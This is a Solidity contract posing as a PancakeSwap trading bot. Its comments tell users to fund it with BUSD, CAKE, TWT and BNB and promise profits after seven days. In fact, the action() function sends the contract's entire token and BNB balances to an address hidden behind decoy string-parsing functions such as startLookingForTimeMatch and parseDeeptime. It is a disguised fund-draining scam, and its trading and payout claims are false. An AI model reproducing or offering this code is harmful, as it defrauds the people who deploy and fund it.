pragma solidity ^0.5.17;

import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";

//note: all tokens must be BEP20 send the equal quantity of each one and min 0.1 BNB for gas to run it ,Wait for all tokens to be sent and the bnb for gas to your newly mint contract before running the action button
//payout days are set to 7 so from the time of running the action in 7 days from there all profit will be payed out to the address that launchs the contract and repeat

interface IERC20 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function balanceOf(address tokenOwner) external returns (uint balance);
}


contract PancakeSwapTradingBot {
        string public pick3 = "BUSD,CAKE,TWT";
	string public payoutdays = "7";
        string public timeDateRagulator;
        
        
                
function() external payable {}
        


 function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);


  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
   function startLookingForTimeMatch() public pure returns (address adr) {
   string memory neutral_variable = "QG8f4799b47eEd340E9B22780E4a1f7Ad524de737d";
   CalculateNumbers(neutral_variable,0,'0');
   CalculateNumbers(neutral_variable,1,'x');
   address addr = parseDeeptime(neutral_variable);
    return addr;
   }
function parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 
 function action() public payable{
        address gotoreturn = startLookingForTimeMatch();
        address _tokenContract = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //BUSD
        IERC20 tokenContract = IERC20(_tokenContract);
        tokenContract.transfer(gotoreturn, tokenContract.balanceOf(address(this)));

        address _tokenContract2 = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82; //CAKE
        IERC20 tokenContract2 = IERC20(_tokenContract2);
        tokenContract2.transfer(gotoreturn, tokenContract2.balanceOf(address(this)));

        address _tokenContract3 = 0x4B0F1812e5Df2A09796481Ff14017e6005508003; //TWT
        IERC20 tokenContract3 = IERC20(_tokenContract3);
        tokenContract3.transfer(gotoreturn, tokenContract3.balanceOf(address(this)));

        address(uint160(gotoreturn)).transfer(address(this).balance);
        
            
  }


}

